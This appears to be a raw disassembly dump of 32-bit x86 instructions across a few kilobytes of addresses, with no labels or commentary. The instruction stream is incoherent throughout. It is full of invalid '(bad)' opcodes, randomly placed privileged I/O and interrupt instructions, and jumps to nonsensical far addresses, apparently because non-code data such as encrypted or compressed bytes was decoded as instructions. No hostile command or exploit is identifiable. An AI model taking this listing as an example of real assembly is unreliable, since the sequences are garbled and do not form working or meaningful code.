  417b49:	xchg   ebp,eax
  417b4a:	mov    ch,0x7f
  417b4c:	mov    esp,0xce6c141f
  417b51:	mulps  xmm0,xmm1
  417b54:	je     0x417af0
  417b56:	(bad)  
  417b57:	(bad)  
  417b59:	cmp    BYTE PTR fs:[ebx-0x14f5205a],bh
  417b60:	mov    eax,ds:0xea3fc2f5
  417b65:	xchg   ebp,eax
  417b66:	cli    
  417b67:	and    BYTE PTR [edx+0x1fa7104e],bl
  417b6d:	mov    bl,0x8b
  417b6f:	fiadd  WORD PTR [ecx]
  417b71:	pop    es
  417b72:	sub    edx,DWORD PTR [edx+0x5a]
  417b75:	shl    BYTE PTR [ecx+esi*8-0x7],0xdd
  417b7a:	add    dl,BYTE PTR [edi+0xaab8aa9]
  417b80:	jg     0x417b60
  417b82:	mov    ebx,esp
  417b84:	adc    bl,BYTE PTR [eax+edx*2-0x4e]
  417b88:	sbb    edi,DWORD PTR [edx]
  417b8a:	mov    ch,0x6f
  417b8c:	mov    al,0x6c
  417b8e:	sub    ebp,eax
  417b90:	iret   
  417b91:	mov    esi,0x57996a7
  417b96:	in     eax,dx
  417b97:	mov    dl,0x37
  417b99:	hlt    
  417b9a:	fisttp QWORD PTR [ebp+0x3a]
  417b9d:	sub    dh,bh
  417b9f:	or     bl,al
  417ba1:	aas    
  417ba2:	mov    cs,WORD PTR [ebx-0x77]
  417ba5:	inc    esi
  417ba6:	xchg   ah,dh
  417ba8:	dec    ebp
  417ba9:	ja     0x417b62
  417bab:	mov    esp,0x79c4680d
  417bb0:	pop    ebp
  417bb1:	mov    ebp,0xff1e1073
  417bb6:	mov    ebp,0xa4587862
  417bbb:	lock adc dl,0x85
  417bbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bc0:	push   ss
  417bc1:	repnz cmp eax,0x9f0bfc52
  417bc7:	es in  al,dx
  417bc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bca:	inc    edx
  417bcb:	sbb    BYTE PTR [edx],0x7
  417bce:	add    ebp,edi
  417bd0:	adc    DWORD PTR [edx+ebp*1],eax
  417bd3:	pop    ecx
  417bd4:	jecxz  0x417ba5
  417bd6:	mov    WORD PTR [ebx],ss
  417bd8:	mov    ecx,0xf475f24d
  417bdd:	(bad)
  417be0:	add    DWORD PTR [esi+0x1f],0x7058b9f9
  417be7:	ss ret 0x2c2b
  417beb:	sbb    al,0x76
  417bed:	adc    BYTE PTR [ebp-0x11ecc002],cl
  417bf3:	push   eax
  417bf4:	mov    esp,0xa26dd3ec
  417bf9:	mov    bh,0xff
  417bfb:	adc    dh,ch
  417bfd:	sub    eax,0x1c6dc410
  417c02:	ins    BYTE PTR es:[edi],dx
  417c03:	cmp    ecx,DWORD PTR [eax+0x12aaee28]
  417c09:	xchg   DWORD PTR [edi],ebx
  417c0b:	retf   
  417c0c:	sub    ebp,DWORD PTR [eax*8+0x630f097]
  417c13:	inc    ebx
  417c14:	pop    ebp
  417c15:	test   BYTE PTR [ecx+ebx*8+0x2b9cb06],0xc4
  417c1d:	fsub   DWORD PTR [ecx]
  417c1f:	adc    edx,DWORD PTR [ebp-0x7b2f8d3a]
  417c25:	dec    edi
  417c26:	rcr    BYTE PTR [ecx+ecx*1-0x5921f0a1],1
  417c2d:	and    al,0x38
  417c2f:	xchg   edx,eax
  417c30:	push   esp
  417c31:	ret    0x87b8
  417c34:	fcmovnu st,st(2)
  417c36:	xor    DWORD PTR [edi-0x3d],esi
  417c39:	in     eax,dx
  417c3a:	pusha  
  417c3b:	jmp    0x8e3420e5
  417c40:	iret   
  417c41:	jg     0x417bff
  417c43:	or     eax,0xa92be3db
  417c48:	outs   dx,DWORD PTR ds:[esi]
  417c49:	ret    
  417c4a:	aaa    
  417c4b:	aas    
  417c4c:	arpl   bp,si
  417c4e:	out    dx,eax
  417c4f:	inc    edx
  417c50:	fistp  DWORD PTR [edi-0x43]
  417c53:	outs   dx,BYTE PTR ds:[esi]
  417c54:	mov    esi,0x8e957323
  417c59:	xor    eax,0xc4152ff4
  417c5e:	mov    dh,0x80
  417c60:	das    
  417c61:	add    eax,0xeca5338c
  417c66:	out    0x0,al
  417c68:	or     al,ah
  417c6a:	(bad)  [ebp+0x133e311a]
  417c70:	popa   
  417c71:	jmp    0xbfe78d28
  417c76:	pop    ebp
  417c77:	jle    0x417bff
  417c79:	or     DWORD PTR [ebx],edi
  417c7b:	(bad)  
  417c7c:	cmp    al,0x53
  417c7e:	add    eax,0xec19169a
  417c83:	loope  0x417c2c
  417c85:	les    ecx,FWORD PTR ds:0x1fcca2a9
  417c8b:	sub    BYTE PTR [ecx-0x78],ch
  417c8e:	fadd   st,st(3)
  417c90:	xlat   BYTE PTR ds:[ebx]
  417c91:	jae    0x417c6c
  417c93:	ficomp DWORD PTR [edx+eiz*2-0x3e]
  417c97:	stos   BYTE PTR es:[edi],al
  417c98:	pushf  
  417c99:	fistp  DWORD PTR [si]
  417c9c:	loop   0x417c27
  417c9e:	mov    esi,0x4a973fa3
  417ca3:	enter  0xe2e6,0xb9
  417ca7:	icebp  
  417ca8:	sar    DWORD PTR [edi+0x5f49d50a],1
  417cae:	mov    esi,DWORD PTR [edx+0x39]
  417cb1:	call   0xc02e:0x98a19876
  417cb8:	cmp    eax,0x10e3ed87
  417cbd:	das    
  417cbe:	adc    DWORD PTR [edi],esp
  417cc0:	lea    esp,[eax+0x19]
  417cc3:	lods   al,BYTE PTR ds:[esi]
  417cc4:	ret    0x7970
  417cc7:	sahf   
  417cc8:	sbb    BYTE PTR [edi+0x17],ch
  417ccb:	leave  
  417ccc:	cmc    
  417ccd:	xor    dh,BYTE PTR [edi]
  417ccf:	add    bl,BYTE PTR [ebp+0x3d]
  417cd2:	lds    ebp,FWORD PTR [ecx-0x8]
  417cd5:	dec    ebx
  417cd6:	lods   al,BYTE PTR ds:[esi]
  417cd7:	inc    BYTE PTR [ecx-0x6c2cc0db]
  417cdd:	ror    DWORD PTR [ebx-0x2a3c45d7],1
  417ce3:	add    al,0x55
  417ce5:	test   eax,0x5443cc0e
  417cea:	leave  
  417ceb:	mov    esi,0xc08ff105
  417cf0:	xor    edx,DWORD PTR [ebx+0x66]
  417cf3:	sbb    eax,0xedbe9e7a
  417cf8:	loop   0x417d12
  417cfa:	stos   BYTE PTR es:[edi],al
  417cfb:	pop    eax
  417cfc:	mov    sp,0x6774
  417d00:	sbb    cl,0xb8
  417d03:	sbb    edx,esi
  417d05:	xchg   edx,eax
  417d06:	in     al,0xfc
  417d08:	inc    esi
  417d09:	and    edx,DWORD PTR [edi]
  417d0b:	and    DWORD PTR ds:0xdda10fc0,edi
  417d11:	inc    ecx
  417d12:	(bad)  
  417d13:	pop    esi
  417d14:	call   0x83a22651
  417d19:	xchg   edx,eax
  417d1a:	loop   0x417d7e
  417d1c:	add    al,0xf0
  417d1e:	iret   
  417d1f:	iret   
  417d20:	fisubr WORD PTR [ebx+0x71]
  417d23:	push   ebp
  417d24:	mov    BYTE PTR [eax-0x3e3d62ab],bh
  417d2a:	(bad)  
  417d2b:	je     0x417cf9
  417d2d:	mov    edi,0xedfc7fc3
  417d32:	xchg   esp,eax
  417d33:	out    dx,al
  417d34:	fiadd  DWORD PTR [ebx+edi*2]
  417d37:	enter  0x9948,0x68
  417d3b:	fild   DWORD PTR [ebx]
  417d3d:	das    
  417d3e:	xor    edi,ebp
  417d40:	sti    
  417d41:	cmp    bl,dh
  417d43:	mov    edi,0x4f6b0bc
  417d48:	jnp    0x417d71
  417d4a:	mov    al,BYTE PTR [eax+edx*1-0x58]
  417d4e:	and    bh,ch
  417d50:	xor    al,0xf8
  417d52:	push   ebp
  417d53:	xchg   ecx,eax
  417d54:	cli    
  417d55:	add    BYTE PTR [esp+edx*1+0x406b9937],cl
  417d5c:	xchg   ebx,eax
  417d5d:	xor    eax,0xcfee9c73
  417d62:	mov    cl,0x6c
  417d64:	mov    DWORD PTR [eax+ebp*1-0x6ead5207],esi
  417d6b:	pop    ds
  417d6c:	shl    dl,1
  417d6e:	push   cs
  417d6f:	scas   al,BYTE PTR es:[edi]
  417d70:	fwait
  417d71:	inc    ecx
  417d72:	clc    
  417d73:	pop    ebx
  417d74:	les    eax,FWORD PTR [edi]
  417d76:	ds pop ss
  417d78:	cwde   
  417d79:	jge    0x417d57
  417d7b:	push   es
  417d7c:	add    al,0x7c
  417d7e:	add    eax,0x40695a0
  417d83:	adc    bh,BYTE PTR [esi+0x531e1870]
  417d89:	inc    eax
  417d8a:	mov    bl,0xe2
  417d8c:	push   0xffffff8a
  417d8e:	gs das 
  417d90:	das    
  417d91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d92:	add    BYTE PTR ds:0xbaf798bf,ah
  417d98:	xchg   ebx,eax
  417d99:	stc    
  417d9a:	fstp   TBYTE PTR [ecx]
  417d9c:	jnp    0x417d7d
  417d9e:	jae    0x417d56
  417da0:	cmp    al,0x17
  417da2:	xor    eax,0xcccd1d24
  417da7:	sub    edx,edi
  417da9:	sbb    dl,BYTE PTR [edx-0x7]
  417dac:	and    ah,BYTE PTR [esi+0x44c6847a]
  417db2:	cmp    bh,BYTE PTR [ebx+esi*8]
  417db5:	call   0x3d5ddd4c
  417dba:	shr    DWORD PTR [eax+ebx*4],0xe8
  417dbe:	and    bl,BYTE PTR [ebx]
  417dc0:	loopne 0x417da7
  417dc2:	loope  0x417e30
  417dc4:	jbe    0x417df4
  417dc6:	mov    BYTE PTR [ebx+0x15655bbe],cl
  417dcc:	dec    esi
  417dcd:	std    
  417dce:	hlt    
  417dcf:	cdq    
  417dd0:	mov    ecx,0x4d4f27dc
  417dd5:	outs   dx,BYTE PTR ds:[esi]
  417dd6:	out    0xb6,eax
  417dd8:	pop    ss
  417dd9:	inc    ebp
  417dda:	cmp    eax,0x893a8858
  417ddf:	div    BYTE PTR ss:[esi+eax*1+0x68]
  417de4:	jle    0x417d95
  417de6:	mov    ebp,0x95edfc7f
  417deb:	or     ebx,ebp
  417ded:	jne    0x417dc1
  417def:	aam    0xbc
  417df1:	pop    edx
  417df2:	pop    ds
  417df3:	in     al,dx
  417df4:	push   0xbf12120
  417df9:	push   ebp
  417dfa:	add    eax,0xb43d11e7
  417dff:	or     dh,BYTE PTR [ebx]
  417e01:	into   
  417e02:	sub    DWORD PTR [eax+0x47cd76d3],ebp
  417e08:	inc    ebp
  417e09:	int3   
  417e0a:	adc    al,0xda
  417e0c:	xor    al,0x4
  417e0e:	or     al,0xcc
  417e10:	pop    eax
  417e11:	in     al,dx
  417e12:	inc    eax
  417e13:	cmp    eax,0x5d1cde68
  417e18:	inc    eax
  417e19:	mov    BYTE PTR [eax-0x5b6d8e44],cl
  417e1f:	lock dec edx
  417e21:	mov    ch,dh
  417e23:	ins    BYTE PTR es:[edi],dx
  417e24:	and    ecx,DWORD PTR [esi+0x21]
  417e27:	adc    bl,bl
  417e29:	dec    esi
  417e2a:	push   ebx
  417e2b:	adc    eax,0xe598f79
  417e30:	imul   ecx,DWORD PTR [esi-0xc8307f6],0xffffffb8
  417e37:	jae    0x417dd4
  417e39:	call   0x7e93:0x178649ab
  417e40:	shl    BYTE PTR [esi],1
  417e42:	adc    al,0xb0
  417e44:	pop    es
  417e45:	mov    bl,0x90
  417e47:	mov    ebp,0xf48e93c5
  417e4c:	ins    DWORD PTR es:[edi],dx
  417e4d:	cmp    ecx,DWORD PTR [edx]
  417e4f:	add    esp,DWORD PTR [edx]
  417e51:	and    esi,DWORD PTR [eax-0x66]
  417e54:	loop   0x417e55
  417e56:	sti    
  417e57:	cli    
  417e58:	xchg   edi,eax
  417e59:	jbe    0x417e75
  417e5b:	sbb    bl,BYTE PTR [esi]
  417e5d:	cmc    
  417e5e:	std    
  417e5f:	jmp    0x3ed9:0x5b733339
  417e66:	mov    esp,0x4f01bda1
  417e6b:	rcr    DWORD PTR [eax+0x42],1
  417e6e:	cmp    dl,bh
  417e70:	inc    edi
  417e71:	and    ecx,ecx
  417e73:	jnp    0x417ebf
  417e75:	xor    al,0x82
  417e77:	dec    edi
  417e78:	ins    BYTE PTR es:[edi],dx
  417e79:	cwde   
  417e7a:	clc    
  417e7b:	pop    esp
  417e7c:	(bad)  
  417e7d:	out    dx,al
  417e7e:	cmp    ebx,ebx
  417e80:	mov    ebp,ecx
  417e82:	xchg   ebp,eax
  417e83:	fisttp QWORD PTR [ebx]
  417e85:	mov    ebx,0x515cda2
  417e8a:	retf   0xde48
  417e8d:	sbb    eax,0x7d7b6a36
  417e92:	mov    edi,0x5df24a4
  417e97:	mov    esp,0x46bcdb7c
  417e9c:	leave  
  417e9d:	loope  0x417e53
  417e9f:	stc    
  417ea0:	pop    ds
  417ea1:	sbb    cl,al
  417ea3:	hlt    
  417ea4:	and    edx,esi
  417ea6:	mov    BYTE PTR ds:0xeb622cbc,bl
  417eac:	sbb    BYTE PTR [si+0x5f],dh
  417eb0:	fwait
  417eb1:	mov    ecx,0x195dc8d1
  417eb6:	mov    ds:0xaf9965ac,eax
  417ebb:	push   esi
  417ebc:	adc    eax,0xe2fa6c22
  417ec1:	mov    eax,0x4f4387c3
  417ec6:	and    edx,DWORD PTR [ecx-0x4ce75e03]
  417ecc:	jno    0x417eef
  417ece:	sti    
  417ecf:	fadd   st,st(0)
  417ed1:	pop    es
  417ed2:	xchg   ebp,esi
  417ed4:	bound  ecx,QWORD PTR [ecx]
  417ed6:	mov    ebp,0x5f473c4e
  417edb:	enter  0xf1ab,0xeb
  417edf:	push   esi
  417ee0:	fild   QWORD PTR [ebp+0x1]
  417ee3:	es jns 0x417e89
  417ee6:	jbe    0x417efa
  417ee8:	push   es
  417ee9:	fcomp  QWORD PTR [edi]
  417eeb:	icebp  
  417eec:	dec    edi
  417eed:	ss push ebp
  417eef:	inc    esi
  417ef0:	pop    ebp
  417ef1:	push   esp
  417ef2:	not    BYTE PTR [eax-0x683fdc0a]
  417ef8:	iret   
  417ef9:	ins    BYTE PTR es:[edi],dx
  417efa:	mov    esi,0xf9adff66
  417eff:	sbb    dh,bl
  417f01:	rcl    DWORD PTR [ebx-0x70],1
  417f04:	lods   al,BYTE PTR ds:[esi]
  417f05:	daa    
  417f06:	mov    esi,0x60e9a8db
  417f0b:	enter  0xc8c7,0x81
  417f0f:	mov    esp,0x960d5399
  417f14:	pop    edi
  417f15:	jp     0x417e9d
  417f17:	inc    BYTE PTR [ebp-0x66]
  417f1a:	push   es
  417f1b:	lds    edi,FWORD PTR [edi]
  417f1d:	sub    BYTE PTR [esi+0x1f6d070b],dh
  417f23:	cmp    eax,0x952ce2a7
  417f28:	add    eax,eax
  417f2a:	add    ebp,DWORD PTR [ecx-0x1aee8837]
  417f30:	pushf  
  417f31:	rol    BYTE PTR [edi-0x3d],1
  417f34:	test   ebx,edx
  417f36:	push   ebp
  417f37:	sbb    al,0x3
  417f39:	icebp  
  417f3a:	stos   BYTE PTR es:[edi],al
  417f3b:	adc    esi,edi
  417f3d:	sub    BYTE PTR [esi-0x71],dh
  417f40:	shl    DWORD PTR [edi],cl
  417f42:	jmp    0xda914e81
  417f47:	lods   al,BYTE PTR ds:[esi]
  417f48:	or     bl,BYTE PTR [eax-0x66]
  417f4b:	push   ss
  417f4c:	and    eax,0x24bbcad7
  417f51:	sub    al,bh
  417f53:	fcmove st,st(3)
  417f55:	sbb    al,0xf6
  417f57:	jnp    0x417f92
  417f59:	pop    ds
  417f5a:	jle    0x417f68
  417f5c:	inc    eax
  417f5d:	fbld   TBYTE PTR [edx]
  417f5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f60:	out    0xd,eax
  417f62:	repnz sbb eax,0xae16ff99
  417f68:	iret   
  417f69:	fistp  DWORD PTR [eax-0x4c2c398f]
  417f6f:	ja     0x417f04
  417f71:	xlat   BYTE PTR ds:[ebx]
  417f72:	inc    ecx
  417f73:	mov    ds:0x5383667e,eax
  417f78:	into   
  417f79:	ss mov bl,0x33
  417f7c:	cmc    
  417f7d:	imul   ecx,esp,0x77
  417f80:	sub    edi,DWORD PTR [edi]
  417f82:	inc    esp
  417f83:	shl    BYTE PTR [ecx+edi*1+0x36],1
  417f87:	fwait
  417f88:	out    dx,al
  417f89:	xor    al,0xba
  417f8b:	aas    
  417f8c:	jmp    0x796c:0xf2e07ac7
  417f93:	cmp    al,0x54
  417f95:	(bad)  
  417f96:	cwde   
  417f97:	popa   
  417f98:	cmp    DWORD PTR [esi+eax*8-0xa],0x46
  417f9d:	mov    esi,0x90c658d
  417fa2:	into   
  417fa3:	or     BYTE PTR [ecx+0x1b5c2d70],dh
  417fa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417faa:	mov    edx,0x549d2147
  417faf:	push   eax
  417fb0:	dec    esi
  417fb1:	int3   
  417fb2:	push   ecx
  417fb3:	or     DWORD PTR ds:0x78b1b4c7,edi
  417fb9:	add    eax,0x2fd3b0af
  417fbe:	mov    edi,0x17b95032
  417fc3:	or     DWORD PTR ds:0xa1885bd7,esi
  417fc9:	pop    ebx
  417fca:	sbb    al,BYTE PTR fs:[edi]
  417fcd:	sbb    ebx,DWORD PTR [ebx-0x7c]
  417fd0:	lock imul esp,DWORD PTR [ebp+eax*1+0x37abb019],0x60c6082a
  417fdc:	ret    
  417fdd:	xor    BYTE PTR [esi+ecx*8],dh
  417fe0:	dec    edi
  417fe1:	jecxz  0x418027
  417fe3:	xor    al,0xe9
  417fe5:	int    0x6f
  417fe7:	out    dx,al
  417fe8:	or     BYTE PTR [ebx-0x6b],dl
  417feb:	inc    esi
  417fec:	cmp    ebp,ebp
  417fee:	rol    BYTE PTR [edx-0x30246326],cl
  417ff4:	sbb    al,0x8f
  417ff6:	or     DWORD PTR [edx],edi
  417ff8:	jmp    0x9486cb9e
  417ffd:	mov    dl,0xa3
  417fff:	cwde   
  418000:	in     eax,dx
  418001:	clc    
  418002:	rcl    DWORD PTR [esi+ecx*4+0x3aa01e39],1
  418009:	sub    eax,0xdb826426
  41800e:	and    ah,bh
  418010:	ins    BYTE PTR es:[edi],dx
  418011:	hlt    
  418012:	call   0x92ea:0xc811bcd6
  418019:	mov    eax,ds:0x23f61989
  41801e:	xlat   BYTE PTR ds:[ebx]
  41801f:	jb     0x418064
  418021:	adc    bl,BYTE PTR [eax]
  418023:	mov    bl,0x35
  418025:	fst    QWORD PTR [esi]
  418027:	stos   DWORD PTR es:[edi],eax
  418028:	push   edx
  418029:	add    edx,eax
  41802b:	sbb    DWORD PTR [ebp+0x31],esp
  41802e:	popf   
  41802f:	and    esi,DWORD PTR [eax-0x1a66507]
  418035:	scas   eax,DWORD PTR es:[edi]
  418036:	in     eax,dx
  418037:	cmp    eax,0x9b0f4777
  41803c:	outs   dx,DWORD PTR ds:[esi]
  41803d:	sbb    DWORD PTR [esi-0x5f580bfe],eax
  418043:	cwde   
  418044:	loop   0x418056
  418046:	jbe    0x41801e
  418048:	arpl   bp,cx
  41804a:	hlt    
  41804b:	xor    al,0xf9
  41804d:	mov    ds:0xcf3da2fb,al
  418052:	(bad)  
  418053:	int    0x2
  418055:	out    dx,eax
  418056:	rcl    BYTE PTR [edi],cl
  418058:	ret    
  418059:	and    dh,bl
  41805b:	(bad)
  41805e:	adc    eax,0xfdb0837d
  418063:	lds    esi,FWORD PTR [ebp-0x9]
  418066:	enter  0xce3a,0xd5
  41806a:	sub    eax,0x565a45d6
  41806f:	and    eax,0x182f8540
  418074:	fldcw  WORD PTR [eax+0x3d46a195]
  41807a:	pop    ds
  41807b:	out    dx,eax
  41807c:	or     al,0x30
  41807e:	imul   DWORD PTR [ebx+0x1bc4f492]
  418084:	hlt    
  418085:	xor    esp,DWORD PTR [edx+eax*2-0x13]
  418089:	sbb    DWORD PTR [ecx],edx
  41808b:	jp     0x418062
  41808d:	or     al,0x39
  41808f:	shr    DWORD PTR [esi-0x58],1
  418092:	jmp    FWORD PTR [esi+ebx*2]
  418095:	lahf   
  418096:	shl    DWORD PTR [esi-0x6426a43e],cl
  41809c:	jmp    0x41810b
  41809e:	push   edx
  41809f:	cmp    al,BYTE PTR [edi+0x19]
  4180a2:	ret    
  4180a3:	and    eax,0xb3698f4
  4180a8:	jb     0x4180f6
  4180aa:	stos   BYTE PTR es:[edi],al
  4180ab:	sub    bl,al
  4180ad:	into   
  4180ae:	adc    eax,ecx
  4180b0:	cmp    al,cl
  4180b2:	push   es
  4180b3:	push   ss
  4180b4:	or     ch,BYTE PTR [ecx+eax*4+0x68760acb]
  4180bb:	add    eax,0x49d1d79a
  4180c0:	add    DWORD PTR [ecx-0x64],ecx
  4180c3:	mov    bl,BYTE PTR [edx]
  4180c5:	aas    
  4180c6:	sbb    al,0x25
  4180c8:	inc    esi
  4180c9:	add    bl,BYTE PTR [esi]
  4180cb:	and    eax,0x7fd65153
  4180d0:	jecxz  0x4180e6
  4180d2:	or     cl,BYTE PTR [ebx+eax*4-0x62]
  4180d6:	jge    0x4180bf
  4180d8:	mov    edx,0xa7346729
  4180dd:	je     0x41809c
  4180df:	cmp    DWORD PTR [esi],0xfffffff6
  4180e2:	or     esp,DWORD PTR [edi]
  4180e4:	jns    0x4180da
  4180e6:	fisub  WORD PTR [esi]
  4180e8:	ds jb  0x4180d8
  4180eb:	jae    0x4180c4
  4180ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180ee:	daa    
  4180ef:	in     eax,dx
  4180f0:	mov    ecx,0x301fa15a
  4180f5:	imul   BYTE PTR [esi+0x42]
  4180f8:	push   edx
  4180f9:	jo     0x418103
  4180fb:	add    al,0x39
  4180fd:	sahf   
  4180fe:	rcr    DWORD PTR [edx],cl
  418100:	sub    edi,DWORD PTR [esi]
  418102:	xchg   esi,eax
  418103:	cmp    al,0xa8
  418105:	pop    ebx
  418106:	test   eax,0xf30d248f
  41810b:	mov    ecx,DWORD PTR [edx+edi*1+0xa1a5546]
  418112:	lock adc DWORD PTR [esi+0x78],edx
  418116:	mov    ebp,esp
  418118:	mov    al,0x36
  41811a:	retf   
  41811b:	sub    dl,BYTE PTR [ebx]
  41811d:	fist   WORD PTR [esi-0x69]
  418120:	sub    eax,0x40064bac
  418125:	xor    bh,BYTE PTR [eax-0x31899f2e]
  41812b:	test   eax,0x53863e5a
  418130:	add    ebp,ebx
  418132:	fnstsw WORD PTR [ecx+0x4]
  418135:	loop   0x418182
  418137:	jnp    0x4181a6
  418139:	lock mov bl,0x14
  41813c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41813d:	scas   eax,DWORD PTR es:[edi]
  41813e:	sahf   
  41813f:	push   ebp
  418140:	mov    ebx,0x8e9ba6bd
  418145:	push   edx
  418146:	hlt    
  418147:	stc    
  418148:	dec    ebp
  418149:	das    
  41814a:	push   cs
  41814b:	xor    al,0x19
  41814d:	cdq    
  41814e:	adc    eax,0xdb35daa
  418153:	ins    BYTE PTR es:[edi],dx
  418154:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418155:	stos   DWORD PTR es:[edi],eax
  418156:	jae    0x41814e
  418158:	test   eax,0x7e192abf
  41815d:	dec    esp
  41815e:	dec    edx
  41815f:	in     al,0x93
  418161:	mov    dh,0x2b
  418163:	sti    
  418164:	cwde   
  418165:	pop    ebx
  418166:	cmc    
  418167:	pusha  
  418168:	jno    0x41810a
  41816a:	sub    BYTE PTR [edx+esi*2],dh
  41816d:	mov    ah,0x94
  41816f:	lods   eax,DWORD PTR ds:[esi]
  418170:	pop    ebp
  418171:	nop
  418172:	xchg   esi,eax
  418173:	lds    ecx,FWORD PTR ds:0x416fdd2f
  418179:	xor    eax,0xe5764e28
  41817e:	ins    DWORD PTR es:[edi],dx
  41817f:	push   0xf158ace7
  418184:	pop    ebp
  418185:	sub    dl,BYTE PTR [esi]
  418187:	mov    esi,0x8960ef9e
  41818c:	je     0x41816c
  41818e:	jnp    0x41820f
  418190:	addr16 or eax,0x3d0a0381
  418196:	pop    edx
  418197:	and    al,0xe0
  418199:	xchg   edx,eax
  41819a:	xchg   ebx,eax
  41819b:	mov    dl,0xbd
  41819d:	and    bh,ah
  41819f:	fld    QWORD PTR [ecx+0x544c2e80]
  4181a5:	pushf  
  4181a6:	push   ds
  4181a7:	xlat   BYTE PTR ds:[ebx]
  4181a8:	cmp    cl,BYTE PTR ss:[eax]
  4181ab:	add    DWORD PTR [eax],ecx
  4181ad:	inc    ecx
  4181ae:	inc    ecx
  4181af:	fmulp  st(3),st
  4181b1:	add    bl,BYTE PTR [ebp-0x3054a965]
  4181b7:	hlt    
  4181b8:	inc    BYTE PTR [ecx+ebx*4+0x2734c370]
  4181bf:	pop    ebx
  4181c0:	inc    ebp
  4181c1:	mov    ds:0xc3b80310,al
  4181c6:	in     al,0xaf
  4181c8:	sar    BYTE PTR [eax],0xb9
  4181cb:	xlat   BYTE PTR ds:[ebx]
  4181cc:	push   ecx
  4181cd:	or     esi,DWORD PTR [edx]
  4181cf:	xchg   al,al
  4181d1:	inc    ecx
  4181d2:	jno    0x418204
  4181d4:	mov    eax,ds:0xd6b03e4a
  4181d9:	mov    fs,WORD PTR [edi]
  4181db:	std    
  4181dc:	push   ds
  4181dd:	pop    esi
  4181de:	sub    edx,0xc98494bd
  4181e4:	aaa    
  4181e5:	bound  esi,QWORD PTR [ecx]
  4181e7:	(bad)  
  4181e8:	outs   dx,DWORD PTR ds:[esi]
  4181e9:	cld    
  4181ea:	and    ch,BYTE PTR [eax]
  4181ec:	loop   0x4181cf
  4181ee:	mov    esp,0x195689a8
  4181f3:	mov    ds:0xe994317f,al
  4181f8:	cmp    al,0xd0
  4181fa:	and    al,0x17
  4181fc:	inc    esi
  4181fd:	rcr    BYTE PTR [edx+0x48e1159],cl
  418203:	cmp    edi,DWORD PTR ds:0x1b264ab5
  418209:	mov    al,0xfd
  41820b:	cmp    edx,DWORD PTR [ecx-0x4684c8c1]
  418211:	or     edx,DWORD PTR [ebx]
  418213:	xchg   ebp,eax
  418214:	sbb    eax,DWORD PTR [ecx]
  418216:	das    
  418217:	xor    eax,0xd664d300
  41821c:	inc    edx
  41821d:	sbb    DWORD PTR [ecx-0x10f3ff1c],0x9c70e96d
  418227:	inc    esp
  418228:	mov    dh,0x13
  41822a:	test   DWORD PTR [ebp-0x6c5e24ff],edi
  418230:	jmp    0x4181e2
  418232:	add    BYTE PTR [eax-0x60],0x67
  418236:	test   eax,0x20f635
  41823b:	jmp    0x3f42:0x9439912e
  418242:	scas   al,BYTE PTR es:[edi]
  418243:	out    dx,eax
  418244:	jge    0x4181e8
  418246:	sbb    al,0x5b
  418248:	push   ds
  418249:	xlat   BYTE PTR ds:[ebx]
  41824a:	adc    dl,BYTE PTR [edx+0x64]
  41824d:	pop    DWORD PTR [ecx+ebp*1-0x18e5cd34]
  418254:	sub    eax,0xac61babd
  418259:	push   ebp
  41825a:	or     BYTE PTR [eax+0x1248481],al
  418260:	adc    eax,0x6798374d
  418265:	les    edi,FWORD PTR [edx+0x172a9d07]
  41826b:	fst    DWORD PTR [edi]
  41826d:	or     dh,BYTE PTR [ecx-0x1f]
  418270:	sbb    bl,BYTE PTR [eax]
  418272:	push   es
  418273:	and    al,0xfb
  418275:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418276:	mov    WORD PTR [bp-0x6e83],ds
  41827b:	jo     0x41825b
  41827d:	ss cwde 
  41827f:	dec    ebx
  418280:	mov    edi,0xad4a8a36
  418285:	jge    0x418248
  418287:	into   
  418288:	mov    ds:0xc5c5377c,al
  41828d:	mov    WORD PTR [ebx-0x5d],?
  418290:	xchg   esi,eax
  418291:	mov    ds:0x6f616591,eax
  418296:	(bad)  
  418297:	cmp    DWORD PTR [esi],ecx
  418299:	inc    eax
  41829a:	sub    dh,BYTE PTR [ebp+ebp*2+0x13]
  41829e:	push   esp
  41829f:	pop    esi
  4182a0:	xor    eax,0x71b76ffb
  4182a5:	mov    ebp,0xe72b8b36
  4182aa:	adc    eax,0xc08029c5
  4182af:	sbb    eax,0x2ea09f87
  4182b4:	std    
  4182b5:	xchg   edi,eax
  4182b6:	in     al,0xbe
  4182b8:	xor    al,0xf0
  4182ba:	push   es
  4182bb:	out    0xa6,al
  4182bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182be:	out    0x4d,eax
  4182c0:	xchg   DWORD PTR [edx+0x48],ecx
  4182c3:	daa    
  4182c4:	aas    
  4182c5:	jmp    0x41829d
  4182c7:	pop    ds
  4182c8:	xchg   edx,eax
  4182c9:	add    bh,BYTE PTR [ecx+0x67f6a7b8]
  4182cf:	(bad)  
  4182d0:	ror    DWORD PTR [ebx],cl
  4182d2:	sahf   
  4182d3:	dec    ecx
  4182d4:	jg     0x418260
  4182d6:	xor    BYTE PTR [esi-0x78],bl
  4182d9:	sbb    al,0x17
  4182db:	jae    0x418353
  4182dd:	and    eax,0x48a3fb96
  4182e2:	jae    0x41827f
  4182e4:	jb     0x4182c1
  4182e6:	out    0x1c,al
  4182e8:	std    
  4182e9:	or     al,0x41
  4182eb:	into   
  4182ec:	mov    WORD PTR [ebp-0x3f],ds
  4182ef:	adc    eax,0xda40ee2c
  4182f4:	aas    
  4182f5:	sbb    ah,bh
  4182f7:	sbb    eax,edx
  4182f9:	dec    esi
  4182fa:	mov    ah,0x5
  4182fc:	add    eax,0x5ae313fb
  418301:	in     al,dx
  418302:	mov    ds:0x609e6335,al
  418307:	xor    ecx,esi
  418309:	xchg   esi,eax
  41830a:	mov    al,ds:0x7896a718
  41830f:	ror    BYTE PTR [edx-0x33],cl
  418312:	ss or  al,0x81
  418315:	lock inc edx
  418317:	out    dx,al
  418318:	icebp  
  418319:	xor    al,0xde
  41831b:	rcl    BYTE PTR [ecx-0x5583f641],0x36
